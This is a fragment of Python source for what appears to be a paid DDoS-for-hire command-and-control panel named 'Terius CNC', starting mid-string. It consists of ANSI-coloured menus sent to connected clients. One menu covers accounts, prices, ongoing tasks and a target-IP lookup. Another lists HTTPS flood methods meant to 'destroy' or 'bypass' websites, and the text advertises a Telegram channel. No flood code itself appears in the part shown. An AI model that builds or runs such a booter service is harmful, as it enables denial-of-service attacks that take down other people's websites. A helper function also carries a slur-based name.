                  \033[1;36m\x1b[38;2;255;4;125m╦\x1b[38;2;255;14;130m \x1b[38;2;255;24;135m╦\x1b[38;2;255;33;140m╔\x1b[38;2;255;43;145m═\x1b[38;2;255;52;150m╗\x1b[38;2;255;62;155m╦\x1b[38;2;255;72;160m \x1b[38;2;255;81;165m \x1b[38;2;255;91;170m╔\x1b[38;2;255;101;175m═\x1b[38;2;255;110;180m╗\x1b[38;2;255;120;185m \x1b[38;2;255;129;190m \x1b[38;2;255;139;195m╔\x1b[38;2;255;149;200m╦\x1b[38;2;255;158;205m╗\x1b[38;2;255;168;210m╔\x1b[38;2;255;178;215m═\x1b[38;2;255;187;220m╗\x1b[38;2;255;197;225m╔\x1b[38;2;255;206;230m╗\x1b[38;2;255;216;235m╔\x1b[38;2;255;226;240m╦\x1b[38;2;255;235;245m \x1b[38;2;255;245;250m╦\x1b[38;2;255;254;255m
                  \x1b[38;2;255;4;125m╠\x1b[38;2;255;14;130m═\x1b[38;2;255;24;135m╣\x1b[38;2;255;33;140m║\x1b[38;2;255;43;145m╣\x1b[38;2;255;52;150m \x1b[38;2;255;62;155m║\x1b[38;2;255;72;160m \x1b[38;2;255;81;165m \x1b[38;2;255;91;170m╠\x1b[38;2;255;101;175m═\x1b[38;2;255;110;180m╝\x1b[38;2;255;120;185m \x1b[38;2;255;129;190m \x1b[38;2;255;139;195m║\x1b[38;2;255;149;200m║\x1b[38;2;255;158;205m║\x1b[38;2;255;168;210m║\x1b[38;2;255;178;215m╣\x1b[38;2;255;187;220m \x1b[38;2;255;197;225m║\x1b[38;2;255;206;230m║\x1b[38;2;255;216;235m║\x1b[38;2;255;226;240m║\x1b[38;2;255;235;245m \x1b[38;2;255;245;250m║\x1b[38;2;255;254;255m
                  \x1b[38;2;255;4;125m╩\x1b[38;2;255;14;130m \x1b[38;2;255;24;135m╩\x1b[38;2;255;33;140m╚\x1b[38;2;255;43;145m═\x1b[38;2;255;52;150m╝\x1b[38;2;255;62;155m╩\x1b[38;2;255;72;160m═\x1b[38;2;255;81;165m╝\x1b[38;2;255;91;170m╩\x1b[38;2;255;101;175m \x1b[38;2;255;110;180m \x1b[38;2;255;120;185m \x1b[38;2;255;129;190m \x1b[38;2;255;139;195m╩\x1b[38;2;255;149;200m \x1b[38;2;255;158;205m╩\x1b[38;2;255;168;210m╚\x1b[38;2;255;178;215m═\x1b[38;2;255;187;220m╝\x1b[38;2;255;197;225m╝\x1b[38;2;255;206;230m╚\x1b[38;2;255;216;235m╝\x1b[38;2;255;226;240m╚\x1b[38;2;255;235;245m═\x1b[38;2;255;245;250m╝\x1b[38;2;255;254;255m\033[0m
             WELCOME TO HELP MENU FOR TERIUS CNC
       \033[1;36m\x1b[38;2;255;2;124m╚\x1b[38;2;255;7;127m═\x1b[38;2;255;13;129m╦\x1b[38;2;255;18;132m═\x1b[38;2;255;23;135m═\x1b[38;2;255;28;137m═\x1b[38;2;255;34;140m═\x1b[38;2;255;39;143m═\x1b[38;2;255;44;146m═\x1b[38;2;255;49;148m═\x1b[38;2;255;55;151m═\x1b[38;2;255;60;154m═\x1b[38;2;255;65;157m═\x1b[38;2;255;70;159m═\x1b[38;2;255;76;162m═\x1b[38;2;255;81;165m═\x1b[38;2;255;86;167m═\x1b[38;2;255;92;170m═\x1b[38;2;255;97;173m═\x1b[38;2;255;102;176m═\x1b[38;2;255;107;178m═\x1b[38;2;255;113;181m═\x1b[38;2;255;118;184m═\x1b[38;2;255;123;186m═\x1b[38;2;255;128;189m═\x1b[38;2;255;134;192m═\x1b[38;2;255;139;195m═\x1b[38;2;255;144;197m═\x1b[38;2;255;149;200m═\x1b[38;2;255;155;203m═\x1b[38;2;255;160;206m═\x1b[38;2;255;165;208m═\x1b[38;2;255;170;211m═\x1b[38;2;255;176;214m═\x1b[38;2;255;181;216m═\x1b[38;2;255;186;219m═\x1b[38;2;255;191;222m═\x1b[38;2;255;197;225m═\x1b[38;2;255;202;227m═\x1b[38;2;255;207;230m═\x1b[38;2;255;212;233m═\x1b[38;2;255;218;235m═\x1b[38;2;255;223;238m═\x1b[38;2;255;228;241m═\x1b[38;2;255;233;244m═\x1b[38;2;255;239;246m╦\x1b[38;2;255;244;249m═\x1b[38;2;255;249;252m╝\x1b[38;2;255;255;255m\033[0m
      \033[1;36m\x1b[38;2;255;2;124m╔\x1b[38;2;255;7;126m═\x1b[38;2;255;12;129m═\x1b[38;2;255;17;132m╩\x1b[38;2;255;22;134m╦\x1b[38;2;255;27;137m═\x1b[38;2;255;32;139m═\x1b[38;2;255;37;142m═\x1b[38;2;255;42;145m═\x1b[38;2;255;47;147m═\x1b[38;2;255;53;150m═\x1b[38;2;255;58;153m═\x1b[38;2;255;63;155m═\x1b[38;2;255;68;158m╦\x1b[38;2;255;73;160m═\x1b[38;2;255;78;163m═\x1b[38;2;255;83;166m═\x1b[38;2;255;88;168m═\x1b[38;2;255;93;171m═\x1b[38;2;255;98;173m═\x1b[38;2;255;103;176m═\x1b[38;2;255;108;179m═\x1b[38;2;255;113;181m═\x1b[38;2;255;118;184m═\x1b[38;2;255;123;187m═\x1b[38;2;255;128;189m═\x1b[38;2;255;133;192m═\x1b[38;2;255;138;194m═\x1b[38;2;255;143;197m═\x1b[38;2;255;148;200m═\x1b[38;2;255;154;202m═\x1b[38;2;255;159;205m═\x1b[38;2;255;164;207m═\x1b[38;2;255;169;210m═\x1b[38;2;255;174;213m═\x1b[38;2;255;179;215m═\x1b[38;2;255;184;218m═\x1b[38;2;255;189;221m═\x1b[38;2;255;194;223m═\x1b[38;2;255;199;226m═\x1b[38;2;255;204;228m═\x1b[38;2;255;209;231m═\x1b[38;2;255;214;234m═\x1b[38;2;255;219;236m═\x1b[38;2;255;224;239m═\x1b[38;2;255;229;241m═\x1b[38;2;255;234;244m╩\x1b[38;2;255;239;247m═\x1b[38;2;255;244;249m═\x1b[38;2;255;249;252m╗\x1b[38;2;255;255;255m\033[0m
      \033[1;36m\x1b[38;2;255;2;124m║\033[0m # \033[1;36m\x1b[38;2;255;22;134m║\033[0m  NAME  \033[1;36m\x1b[38;2;255;68;158m║\033[0m      FUNCTION DESCRIPTION         \033[1;36m\x1b[38;2;255;249;252m║
      \033[1;36m\x1b[38;2;255;2;124m╠\x1b[38;2;255;7;126m═\x1b[38;2;255;12;129m═\x1b[38;2;255;17;132m═\x1b[38;2;255;22;134m╬\x1b[38;2;255;27;137m═\x1b[38;2;255;32;139m═\x1b[38;2;255;37;142m═\x1b[38;2;255;42;145m═\x1b[38;2;255;47;147m═\x1b[38;2;255;53;150m═\x1b[38;2;255;58;153m═\x1b[38;2;255;63;155m═\x1b[38;2;255;68;158m╬\x1b[38;2;255;73;160m═\x1b[38;2;255;78;163m═\x1b[38;2;255;83;166m═\x1b[38;2;255;88;168m═\x1b[38;2;255;93;171m═\x1b[38;2;255;98;173m═\x1b[38;2;255;103;176m═\x1b[38;2;255;108;179m═\x1b[38;2;255;113;181m═\x1b[38;2;255;118;184m═\x1b[38;2;255;123;187m═\x1b[38;2;255;128;189m═\x1b[38;2;255;133;192m═\x1b[38;2;255;138;194m═\x1b[38;2;255;143;197m═\x1b[38;2;255;148;200m═\x1b[38;2;255;154;202m═\x1b[38;2;255;159;205m═\x1b[38;2;255;164;207m═\x1b[38;2;255;169;210m═\x1b[38;2;255;174;213m═\x1b[38;2;255;179;215m═\x1b[38;2;255;184;218m═\x1b[38;2;255;189;221m═\x1b[38;2;255;194;223m═\x1b[38;2;255;199;226m═\x1b[38;2;255;204;228m═\x1b[38;2;255;209;231m═\x1b[38;2;255;214;234m═\x1b[38;2;255;219;236m═\x1b[38;2;255;224;239m═\x1b[38;2;255;229;241m═\x1b[38;2;255;234;244m═\x1b[38;2;255;239;247m═\x1b[38;2;255;244;249m═\x1b[38;2;255;249;252m╣\x1b[38;2;255;255;255m\033[0m
      \033[1;36m\x1b[38;2;255;2;124m║\033[0m 1 \033[1;36m\x1b[38;2;255;22;134m║\033[0m PLAN   \033[1;36m\x1b[38;2;255;68;158m║\033[0m SHOW ACCOUNT INFOMATION           \033[1;36m\x1b[38;2;255;249;252m║
      \033[1;36m\x1b[38;2;255;2;124m║\033[0m 2 \033[1;36m\x1b[38;2;255;22;134m║\033[0m HELP   \033[1;36m\x1b[38;2;255;68;158m║\033[0m SHOW HELP MENU                    \033[1;36m\x1b[38;2;255;249;252m║
      \033[1;36m\x1b[38;2;255;2;124m║\033[0m 3 \033[1;36m\x1b[38;2;255;22;134m║\033[0m METHOD \033[1;36m\x1b[38;2;255;68;158m║\033[0m SHOW METHOD MENU                  \033[1;36m\x1b[38;2;255;249;252m║
      \033[1;36m\x1b[38;2;255;2;124m║\033[0m 4 \033[1;36m\x1b[38;2;255;22;134m║\033[0m CLEAR  \033[1;36m\x1b[38;2;255;68;158m║\033[0m CLEAR TERMINAL & RETURN MAIN MENU \033[1;36m\x1b[38;2;255;249;252m║
      \033[1;36m\x1b[38;2;255;2;124m║\033[0m 5 \033[1;36m\x1b[38;2;255;22;134m║\033[0m PRICE  \033[1;36m\x1b[38;2;255;68;158m║\033[0m DISPLAY PRICE FOR CNC             \033[1;36m\x1b[38;2;255;249;252m║
      \033[1;36m\x1b[38;2;255;2;124m║\033[0m 6 \033[1;36m\x1b[38;2;255;22;134m║\033[0m ONGOING\033[1;36m\x1b[38;2;255;68;158m║\033[0m SHOW ONGOING TASK                 \033[1;36m\x1b[38;2;255;249;252m║
      \033[1;36m\x1b[38;2;255;2;124m║\033[0m 7 \033[1;36m\x1b[38;2;255;22;134m║\033[0m GEOIP  \033[1;36m\x1b[38;2;255;68;158m║ \033[0mCHECK TARGET IP                   \033[1;36m\x1b[38;2;255;249;252m║
      \033[1;36m\x1b[38;2;255;2;124m║\033[0m 8 \033[1;36m\x1b[38;2;255;22;134m║\033[0m ADD    \033[1;36m\x1b[38;2;255;68;158m║ \033[0mADD NEW ACCOUNT                   \033[1;36m\x1b[38;2;255;249;252m║
      \033[1;36m\x1b[38;2;255;2;124m║\033[0m 9 \033[1;36m\x1b[38;2;255;22;134m║\033[0m RM     \033[1;36m\x1b[38;2;255;68;158m║ \033[0mREMOVE ACCOUNT                    \033[1;36m\x1b[38;2;255;249;252m║
      \033[1;36m\x1b[38;2;255;2;124m╚\x1b[38;2;255;7;126m═\x1b[38;2;255;12;129m═\x1b[38;2;255;17;132m═\x1b[38;2;255;22;134m╩\x1b[38;2;255;27;137m═\x1b[38;2;255;32;139m═\x1b[38;2;255;37;142m═\x1b[38;2;255;42;145m═\x1b[38;2;255;47;147m═\x1b[38;2;255;53;150m═\x1b[38;2;255;58;153m═\x1b[38;2;255;63;155m═\x1b[38;2;255;68;158m╩\x1b[38;2;255;73;160m═\x1b[38;2;255;78;163m═\x1b[38;2;255;83;166m═\x1b[38;2;255;88;168m═\x1b[38;2;255;93;171m═\x1b[38;2;255;98;173m═\x1b[38;2;255;103;176m═\x1b[38;2;255;108;179m═\x1b[38;2;255;113;181m═\x1b[38;2;255;118;184m═\x1b[38;2;255;123;187m═\x1b[38;2;255;128;189m═\x1b[38;2;255;133;192m═\x1b[38;2;255;138;194m═\x1b[38;2;255;143;197m═\x1b[38;2;255;148;200m═\x1b[38;2;255;154;202m═\x1b[38;2;255;159;205m═\x1b[38;2;255;164;207m═\x1b[38;2;255;169;210m═\x1b[38;2;255;174;213m═\x1b[38;2;255;179;215m═\x1b[38;2;255;184;218m═\x1b[38;2;255;189;221m═\x1b[38;2;255;194;223m═\x1b[38;2;255;199;226m═\x1b[38;2;255;204;228m═\x1b[38;2;255;209;231m═\x1b[38;2;255;214;234m═\x1b[38;2;255;219;236m═\x1b[38;2;255;224;239m═\x1b[38;2;255;229;241m═\x1b[38;2;255;234;244m═\x1b[38;2;255;239;247m═\x1b[38;2;255;244;249m═\x1b[38;2;255;249;252m╝\x1b[38;2;255;255;255m\033[0m

 Tips : {random.choice(lol)}[0m\n""")
def mth(client_socket,usernamex):
    gay(client_socket,usernamex)
    send(client_socket,f"""
                          \033[1;36m\x1b[38;2;252;6;6m╔\x1b[38;2;252;12;12m╦\x1b[38;2;252;18;18m╗\x1b[38;2;252;25;25m╔\x1b[38;2;252;31;31m═\x1b[38;2;252;38;38m╗\x1b[38;2;252;44;44m╦\x1b[38;2;252;50;50m═\x1b[38;2;252;57;57m╗\x1b[38;2;252;63;63m╦\x1b[38;2;252;69;69m╦\x1b[38;2;252;76;76m \x1b[38;2;252;82;82m╦\x1b[38;2;253;89;89m╔\x1b[38;2;253;95;95m═\x1b[38;2;253;101;101m╗\x1b[38;2;253;108;108m \x1b[38;2;253;114;114m \x1b[38;2;253;121;121m╔\x1b[38;2;253;127;127m╦\x1b[38;2;253;133;133m╗\x1b[38;2;253;140;140m╔\x1b[38;2;253;146;146m═\x1b[38;2;253;152;152m╗\x1b[38;2;253;159;159m╔\x1b[38;2;253;165;165m╦\x1b[38;2;254;172;172m╗\x1b[38;2;254;178;178m╦\x1b[38;2;254;184;184m \x1b[38;2;254;191;191m╦\x1b[38;2;254;197;197m╔\x1b[38;2;254;203;203m═\x1b[38;2;254;210;210m╗\x1b[38;2;254;216;216m╔\x1b[38;2;254;223;223m╦\x1b[38;2;254;229;229m╗\x1b[38;2;254;235;235m╔\x1b[38;2;254;242;242m═\x1b[38;2;254;248;248m╗\x1b[38;2;255;255;255m\033[0m
                           \033[1;36m\x1b[38;2;252;6;6m║\x1b[38;2;252;12;12m \x1b[38;2;252;19;19m║\x1b[38;2;252;25;25m╣\x1b[38;2;252;32;32m \x1b[38;2;252;39;39m╠\x1b[38;2;252;45;45m╦\x1b[38;2;252;52;52m╝\x1b[38;2;252;58;58m║\x1b[38;2;252;65;65m║\x1b[38;2;252;71;71m \x1b[38;2;252;78;78m║\x1b[38;2;252;84;84m╚\x1b[38;2;253;91;91m═\x1b[38;2;253;97;97m╗\x1b[38;2;253;104;104m \x1b[38;2;253;111;111m \x1b[38;2;253;117;117m║\x1b[38;2;253;124;124m║\x1b[38;2;253;130;130m║\x1b[38;2;253;137;137m║\x1b[38;2;253;143;143m╣\x1b[38;2;253;150;150m \x1b[38;2;253;156;156m \x1b[38;2;253;163;163m║\x1b[38;2;253;169;169m \x1b[38;2;254;176;176m╠\x1b[38;2;254;183;183m═\x1b[38;2;254;189;189m╣\x1b[38;2;254;196;196m║\x1b[38;2;254;202;202m \x1b[38;2;254;209;209m║\x1b[38;2;254;215;215m \x1b[38;2;254;222;222m║\x1b[38;2;254;228;228m║\x1b[38;2;254;235;235m╚\x1b[38;2;254;241;241m═\x1b[38;2;254;248;248m╗\x1b[38;2;255;255;255m\033[0m
                           \033[1;36m\x1b[38;2;252;6;6m╩\x1b[38;2;252;12;12m \x1b[38;2;252;19;19m╚\x1b[38;2;252;25;25m═\x1b[38;2;252;32;32m╝\x1b[38;2;252;39;39m╩\x1b[38;2;252;45;45m╚\x1b[38;2;252;52;52m═\x1b[38;2;252;58;58m╩\x1b[38;2;252;65;65m╚\x1b[38;2;252;71;71m═\x1b[38;2;252;78;78m╝\x1b[38;2;252;84;84m╚\x1b[38;2;253;91;91m═\x1b[38;2;253;97;97m╝\x1b[38;2;253;104;104m \x1b[38;2;253;111;111m \x1b[38;2;253;117;117m╩\x1b[38;2;253;124;124m \x1b[38;2;253;130;130m╩\x1b[38;2;253;137;137m╚\x1b[38;2;253;143;143m═\x1b[38;2;253;150;150m╝\x1b[38;2;253;156;156m \x1b[38;2;253;163;163m╩\x1b[38;2;253;169;169m \x1b[38;2;254;176;176m╩\x1b[38;2;254;183;183m \x1b[38;2;254;189;189m╩\x1b[38;2;254;196;196m╚\x1b[38;2;254;202;202m═\x1b[38;2;254;209;209m╝\x1b[38;2;254;215;215m═\x1b[38;2;254;222;222m╩\x1b[38;2;254;228;228m╝\x1b[38;2;254;235;235m╚\x1b[38;2;254;241;241m═\x1b[38;2;254;248;248m╝\x1b[38;2;255;255;255m\033[0m
              Welcome To The Method Menu, You Can See The Methods In The Menu
          \033[1;36m\x1b[38;2;252;4;4m╔\x1b[38;2;252;8;8m╦\x1b[38;2;252;11;11m═\x1b[38;2;252;15;15m╦\x1b[38;2;252;18;18m═\x1b[38;2;252;21;21m═\x1b[38;2;252;25;25m═\x1b[38;2;252;28;28m═\x1b[38;2;252;32;32m═\x1b[38;2;252;35;35m═\x1b[38;2;252;39;39m═\x1b[38;2;252;42;42m═\x1b[38;2;252;45;45m═\x1b[38;2;252;49;49m═\x1b[38;2;252;52;52m═\x1b[38;2;252;56;56m═\x1b[38;2;252;59;59m═\x1b[38;2;252;63;63m═\x1b[38;2;252;66;66m═\x1b[38;2;252;69;69m═\x1b[38;2;252;73;73m═\x1b[38;2;252;76;76m╦\x1b[38;2;252;80;80m═\x1b[38;2;252;83;83m╦\x1b[38;2;253;87;87m═\x1b[38;2;253;90;90m═\x1b[38;2;253;93;93m═\x1b[38;2;253;97;97m═\x1b[38;2;253;100;100m═\x1b[38;2;253;104;104m═\x1b[38;2;253;107;107m═\x1b[38;2;253;111;111m═\x1b[38;2;253;114;114m═\x1b[38;2;253;117;117m═\x1b[38;2;253;121;121m═\x1b[38;2;253;124;124m═\x1b[38;2;253;128;128m═\x1b[38;2;253;131;131m═\x1b[38;2;253;135;135m═\x1b[38;2;253;138;138m═\x1b[38;2;253;141;141m═\x1b[38;2;253;145;145m═\x1b[38;2;253;148;148m═\x1b[38;2;253;152;152m═\x1b[38;2;253;155;155m═\x1b[38;2;253;159;159m═\x1b[38;2;253;162;162m═\x1b[38;2;253;165;165m═\x1b[38;2;253;169;169m═\x1b[38;2;254;172;172m═\x1b[38;2;254;176;176m═\x1b[38;2;254;179;179m═\x1b[38;2;254;183;183m═\x1b[38;2;254;186;186m═\x1b[38;2;254;189;189m═\x1b[38;2;254;193;193m═\x1b[38;2;254;196;196m═\x1b[38;2;254;200;200m═\x1b[38;2;254;203;203m═\x1b[38;2;254;207;207m═\x1b[38;2;254;210;210m═\x1b[38;2;254;213;213m═\x1b[38;2;254;217;217m═\x1b[38;2;254;220;220m═\x1b[38;2;254;224;224m═\x1b[38;2;254;227;227m═\x1b[38;2;254;231;231m═\x1b[38;2;254;234;234m═\x1b[38;2;254;237;237m═\x1b[38;2;254;241;241m═\x1b[38;2;254;244;244m═\x1b[38;2;254;248;248m═\x1b[38;2;254;251;251m╗\x1b[38;2;255;255;255m\033[0m
          \033[1;36m\x1b[38;2;252;4;4m║\033[0m\033[1;36m\x1b[38;2;252;8;8m│\033[0mH\033[1;36m\x1b[38;2;252;15;15m│\033[0m \x1b[38;5;1m[\033[0mHTTPS-BYPASS\x1b[38;5;1m]\033[0m  \033[1;36m\x1b[38;2;252;76;76m│\033[0mS\033[1;36m\x1b[38;2;252;83;83m│\033[0m BYPASS WEBSITE WITH BYPASS METHOD              \033[1;36m\x1b[38;2;254;251;251m║
          \033[1;36m\x1b[38;2;252;4;4m║\033[0m\033[1;36m\x1b[38;2;252;8;8m│\033[0mH\033[1;36m\x1b[38;2;252;15;15m│\033[0m \x1b[38;5;1m[\033[0mHTTPS-SPAM\x1b[38;5;1m]\033[0m    \033[1;36m\x1b[38;2;252;76;76m│\033[0mS\033[1;36m\x1b[38;2;252;83;83m│\033[0m SPAM ATTACK TO TARGET WITH HIGHT R/Q           \033[1;36m\x1b[38;2;254;251;251m║
          \033[1;36m\x1b[38;2;252;4;4m║\033[0m\033[1;36m\x1b[38;2;252;8;8m│\033[0mH\033[1;36m\x1b[38;2;252;15;15m│\033[0m \x1b[38;5;1m[\033[0mHTTPS-DESTROY\x1b[38;5;1m]\033[0m \033[1;36m\x1b[38;2;252;76;76m│\033[0mS\033[1;36m\x1b[38;2;252;83;83m│\033[0m DESTROY A NORMAL WEBSITE                       \033[1;36m\x1b[38;2;254;251;251m║
          \033[1;36m\x1b[38;2;252;4;4m║\033[0m\033[1;36m\x1b[38;2;252;8;8m│\033[0mH\033[1;36m\x1b[38;2;252;15;15m│\033[0m \x1b[38;5;1m[\033[0mHTTPS-STAR\x1b[38;5;1m]\033[0m    \033[1;36m\x1b[38;2;252;76;76m│\033[0mS\033[1;36m\x1b[38;2;252;83;83m│\033[0m ATTACK TO WEBSITE WITH STAR METHOD             \033[1;36m\x1b[38;2;254;251;251m║
          \033[1;36m\x1b[38;2;252;4;4m║\033[0m\033[1;36m\x1b[38;2;252;8;8m│\033[0mH\033[1;36m\x1b[38;2;252;15;15m│\033[0m \x1b[38;5;1m[\033[0mHTTPS-SUPER\x1b[38;5;1m]\033[0m   \033[1;36m\x1b[38;2;252;76;76m│\033[0mS\033[1;36m\x1b[38;2;252;83;83m│\033[0m ATTACK TO WEBSITE WITH SUPER FLOOD METHOD      \033[1;36m\x1b[38;2;254;251;251m║
          \033[1;36m\x1b[38;2;252;4;4m║\033[0m\033[1;36m\x1b[38;2;252;8;8m│\033[0mH\033[1;36m\x1b[38;2;252;15;15m│\033[0m \x1b[38;5;1m[\033[0mHTTPS-KILLER\x1b[38;5;1m]\033[0m  \033[1;36m\x1b[38;2;252;76;76m│\033[0mS\033[1;36m\x1b[38;2;252;83;83m│\033[0m KILLER A BIG WEBSITE WITH BYPASS METHOD        \033[1;36m\x1b[38;2;254;251;251m║
          \033[1;36m\x1b[38;2;252;4;4m║\033[0m\033[1;36m\x1b[38;2;252;8;8m│\033[0mH\033[1;36m\x1b[38;2;252;15;15m│\033[0m \x1b[38;5;1m[\033[0mHTTPS-LIGHT\x1b[38;5;1m]\033[0m   \033[1;36m\x1b[38;2;252;76;76m│\033[0mS\033[1;36m\x1b[38;2;252;83;83m│\033[0m LIGHT METHOD FOR LARGE SERVERS                 \033[1;36m\x1b[38;2;254;251;251m║
          \033[1;36m\x1b[38;2;252;4;4m╚\x1b[38;2;252;8;8m╩\x1b[38;2;252;11;11m═\x1b[38;2;252;15;15m╩\x1b[38;2;252;18;18m═\x1b[38;2;252;21;21m═\x1b[38;2;252;25;25m═\x1b[38;2;252;28;28m═\x1b[38;2;252;32;32m═\x1b[38;2;252;35;35m═\x1b[38;2;252;39;39m═\x1b[38;2;252;42;42m═\x1b[38;2;252;45;45m═\x1b[38;2;252;49;49m═\x1b[38;2;252;52;52m═\x1b[38;2;252;56;56m═\x1b[38;2;252;59;59m═\x1b[38;2;252;63;63m═\x1b[38;2;252;66;66m═\x1b[38;2;252;69;69m═\x1b[38;2;252;73;73m═\x1b[38;2;252;76;76m╩\x1b[38;2;252;80;80m═\x1b[38;2;252;83;83m╩\x1b[38;2;253;87;87m═\x1b[38;2;253;90;90m═\x1b[38;2;253;93;93m═\x1b[38;2;253;97;97m═\x1b[38;2;253;100;100m═\x1b[38;2;253;104;104m═\x1b[38;2;253;107;107m═\x1b[38;2;253;111;111m═\x1b[38;2;253;114;114m═\x1b[38;2;253;117;117m═\x1b[38;2;253;121;121m═\x1b[38;2;253;124;124m═\x1b[38;2;253;128;128m═\x1b[38;2;253;131;131m═\x1b[38;2;253;135;135m═\x1b[38;2;253;138;138m═\x1b[38;2;253;141;141m═\x1b[38;2;253;145;145m═\x1b[38;2;253;148;148m═\x1b[38;2;253;152;152m═\x1b[38;2;253;155;155m═\x1b[38;2;253;159;159m═\x1b[38;2;253;162;162m═\x1b[38;2;253;165;165m═\x1b[38;2;253;169;169m═\x1b[38;2;254;172;172m═\x1b[38;2;254;176;176m═\x1b[38;2;254;179;179m═\x1b[38;2;254;183;183m═\x1b[38;2;254;186;186m═\x1b[38;2;254;189;189m═\x1b[38;2;254;193;193m═\x1b[38;2;254;196;196m═\x1b[38;2;254;200;200m═\x1b[38;2;254;203;203m═\x1b[38;2;254;207;207m═\x1b[38;2;254;210;210m═\x1b[38;2;254;213;213m═\x1b[38;2;254;217;217m═\x1b[38;2;254;220;220m═\x1b[38;2;254;224;224m═\x1b[38;2;254;227;227m═\x1b[38;2;254;231;231m═\x1b[38;2;254;234;234m═\x1b[38;2;254;237;237m═\x1b[38;2;254;241;241m═\x1b[38;2;254;244;244m═\x1b[38;2;254;248;248m═\x1b[38;2;254;251;251m╝\x1b[38;2;255;255;255m\033[0m
          \033[1;36m\x1b[38;2;252;4;4m╔\x1b[38;2;252;8;8m═\x1b[38;2;252;11;11m═\x1b[38;2;252;15;15m═\x1b[38;2;252;18;18m═\x1b[38;2;252;21;21m═\x1b[38;2;252;25;25m═\x1b[38;2;252;28;28m═\x1b[38;2;252;32;32m═\x1b[38;2;252;35;35m═\x1b[38;2;252;39;39m═\x1b[38;2;252;42;42m═\x1b[38;2;252;45;45m═\x1b[38;2;252;49;49m═\x1b[38;2;252;52;52m═\x1b[38;2;252;56;56m═\x1b[38;2;252;59;59m═\x1b[38;2;252;63;63m═\x1b[38;2;252;66;66m═\x1b[38;2;252;69;69m═\x1b[38;2;252;73;73m═\x1b[38;2;252;76;76m═\x1b[38;2;252;80;80m═\x1b[38;2;252;83;83m═\x1b[38;2;253;87;87m═\x1b[38;2;253;90;90m═\x1b[38;2;253;93;93m═\x1b[38;2;253;97;97m═\x1b[38;2;253;100;100m═\x1b[38;2;253;104;104m═\x1b[38;2;253;107;107m═\x1b[38;2;253;111;111m═\x1b[38;2;253;114;114m═\x1b[38;2;253;117;117m═\x1b[38;2;253;121;121m═\x1b[38;2;253;124;124m═\x1b[38;2;253;128;128m═\x1b[38;2;253;131;131m═\x1b[38;2;253;135;135m═\x1b[38;2;253;138;138m═\x1b[38;2;253;141;141m═\x1b[38;2;253;145;145m═\x1b[38;2;253;148;148m═\x1b[38;2;253;152;152m═\x1b[38;2;253;155;155m═\x1b[38;2;253;159;159m═\x1b[38;2;253;162;162m═\x1b[38;2;253;165;165m═\x1b[38;2;253;169;169m═\x1b[38;2;254;172;172m═\x1b[38;2;254;176;176m═\x1b[38;2;254;179;179m═\x1b[38;2;254;183;183m═\x1b[38;2;254;186;186m═\x1b[38;2;254;189;189m═\x1b[38;2;254;193;193m═\x1b[38;2;254;196;196m═\x1b[38;2;254;200;200m═\x1b[38;2;254;203;203m═\x1b[38;2;254;207;207m═\x1b[38;2;254;210;210m═\x1b[38;2;254;213;213m═\x1b[38;2;254;217;217m═\x1b[38;2;254;220;220m═\x1b[38;2;254;224;224m═\x1b[38;2;254;227;227m═\x1b[38;2;254;231;231m═\x1b[38;2;254;234;234m═\x1b[38;2;254;237;237m═\x1b[38;2;254;241;241m═\x1b[38;2;254;244;244m═\x1b[38;2;254;248;248m═\x1b[38;2;254;251;251m╗\x1b[38;2;255;255;255m\033[0m
          \033[1;36m\x1b[38;2;252;4;4m║\033[0m - - - - - - - - - - - https://t.me/tretraunetwork - - - - - - - - - - \033[1;36m\x1b[38;2;254;251;251m║\033[0m
          \033[1;36m\x1b[38;2;252;4;4m╚\x1b[38;2;252;8;8m═\x1b[38;2;252;11;11m═\x1b[38;2;252;15;15m═\x1b[38;2;252;18;18m═\x1b[38;2;252;21;21m═\x1b[38;2;252;25;25m═\x1b[38;2;252;28;28m═\x1b[38;2;252;32;32m═\x1b[38;2;252;35;35m═\x1b[38;2;252;39;39m═\x1b[38;2;252;42;42m═\x1b[38;2;252;45;45m═\x1b[38;2;252;49;49m═\x1b[38;2;252;52;52m═\x1b[38;2;252;56;56m═\x1b[38;2;252;59;59m═\x1b[38;2;252;63;63m═\x1b[38;2;252;66;66m═\x1b[38;2;252;69;69m═\x1b[38;2;252;73;73m═\x1b[38;2;252;76;76m═\x1b[38;2;252;80;80m═\x1b[38;2;252;83;83m═\x1b[38;2;253;87;87m═\x1b[38;2;253;90;90m═\x1b[38;2;253;93;93m═\x1b[38;2;253;97;97m═\x1b[38;2;253;100;100m═\x1b[38;2;253;104;104m═\x1b[38;2;253;107;107m═\x1b[38;2;253;111;111m═\x1b[38;2;253;114;114m═\x1b[38;2;253;117;117m═\x1b[38;2;253;121;121m═\x1b[38;2;253;124;124m═\x1b[38;2;253;128;128m═\x1b[38;2;253;131;131m═\x1b[38;2;253;135;135m═\x1b[38;2;253;138;138m═\x1b[38;2;253;141;141m═\x1b[38;2;253;145;145m═\x1b[38;2;253;148;148m═\x1b[38;2;253;152;152m═\x1b[38;2;253;155;155m═\x1b[38;2;253;159;159m═\x1b[38;2;253;162;162m═\x1b[38;2;253;165;165m═\x1b[38;2;253;169;169m═\x1b[38;2;254;172;172m═\x1b[38;2;254;176;176m═\x1b[38;2;254;179;179m═\x1b[38;2;254;183;183m═\x1b[38;2;254;186;186m═\x1b[38;2;254;189;189m═\x1b[38;2;254;193;193m═\x1b[38;2;254;196;196m═\x1b[38;2;254;200;200m═\x1b[38;2;254;203;203m═\x1b[38;2;254;207;207m═\x1b[38;2;254;210;210m═\x1b[38;2;254;213;213m═\x1b[38;2;254;217;217m═\x1b[38;2;254;220;220m═\x1b[38;2;254;224;224m═\x1b[38;2;254;227;227m═\x1b[38;2;254;231;231m═\x1b[38;2;254;234;234m═\x1b[38;2;254;237;237m═\x1b[38;2;254;241;241m═\x1b[38;2;254;244;244m═\x1b[38;2;254;248;248m═\x1b[38;2;254;251;251m╝\x1b[38;2;255;255;255m\033[0m
